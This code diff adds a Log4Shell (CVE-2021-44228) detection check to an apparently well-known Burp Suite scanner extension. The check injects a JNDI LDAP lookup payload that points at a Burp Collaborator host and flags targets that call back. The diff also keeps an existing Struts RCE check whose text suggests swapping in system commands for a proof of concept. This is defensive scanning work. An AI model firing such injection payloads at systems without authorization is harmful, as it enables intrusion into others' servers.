@@ -31,7 +31,7 @@ try:
 except ImportError:
     print "Failed to load dependencies. This issue may be caused by using the unstable Jython 2.7 beta."
 
-VERSION = "1.0.22"
+VERSION = "1.0.23"
 FAST_MODE = False
 DEBUG = False
 callbacks = None
@@ -69,6 +69,7 @@ class BurpExtender(IBurpExtender):
             callbacks.registerScannerCheck(SimpleFuzz())
             callbacks.registerScannerCheck(EdgeSideInclude())
             if collab_enabled:
+                callbacks.registerScannerCheck(Log4j())
                 callbacks.registerScannerCheck(Solr())
                 callbacks.registerScannerCheck(doStruts_2017_12611_scan())
 
@@ -705,6 +706,25 @@ class doStruts_2017_12611_scan(IScannerCheck):
                 "The application appears to be vulnerable to CVE-2017-12611, enabling arbitrary code execution.  Replace the ping command in the suspicious request with system commands for a POC.",
                 'Firm', 'High')]
         return []
+
+    def doPassiveScan(self, basePair):
+        return []
+
+    def consolidateDuplicateIssues(self, existingIssue, newIssue):
+        return is_same_issue(existingIssue, newIssue)
+
+
+class Log4j(IScannerCheck):
+    def doActiveScan(self, basePair, insertionPoint):
+        collab = callbacks.createBurpCollaboratorClientContext()
+        attack = request(basePair, insertionPoint, "${jndi:ldap://"+collab.generatePayload(True)+"/a}")
+        interactions = collab.fetchAllCollaboratorInteractions()
+        if interactions:
+            return [CustomScanIssue(attack.getHttpService(), helpers.analyzeRequest(attack).getUrl(), [attack],
+                                    'Log4Shell (CVE-2021-44228)',
+                                    "The application appears to be running a version of log4j vulnerable to RCE. ActiveScan++ sent a reference to an external file, and received a pingback from the server.<br/><br/>" +
+                                    "To investigate, use the manual collaborator client. It may be possible to escalate this vulnerability into RCE. Please refer to https://www.lunasec.io/docs/blog/log4j-zero-day/ for further information",
+                                    'Firm', 'High')]
 
     def doPassiveScan(self, basePair):
         return []
